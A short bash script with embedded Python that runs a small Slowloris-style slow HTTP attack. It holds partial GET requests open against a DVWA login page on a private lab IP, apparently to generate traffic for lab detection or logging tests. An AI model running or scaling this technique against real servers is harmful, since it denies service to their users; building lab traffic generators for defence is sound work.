#!/bin/bash
set -eu

RUN_ID="${1:-no-run-id}"
TARGET_IP="${TARGET_IP:-192.168.50.10}"

echo "[run_id=$RUN_ID] Slow HTTP simulation starting target=$TARGET_IP ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
python3 - <<'PYEOF' "$TARGET_IP"
import socket
import sys
import time

target = sys.argv[1]
sockets = []
for _ in range(12):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    try:
        sock.connect((target, 80))
        sock.sendall(b"GET /dvwa/login.php HTTP/1.1\r\nHost: test\r\n")
        sockets.append(sock)
    except OSError:
        sock.close()

for _ in range(5):
    for sock in list(sockets):
        try:
            sock.sendall(b"X-a: keepalive\r\n")
        except OSError:
            sock.close()
            sockets.remove(sock)
    time.sleep(2)

for sock in sockets:
    try:
        sock.sendall(b"\r\n")
    except OSError:
        pass
    sock.close()
PYEOF
echo "[run_id=$RUN_ID] Slow HTTP simulation done target=$TARGET_IP ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"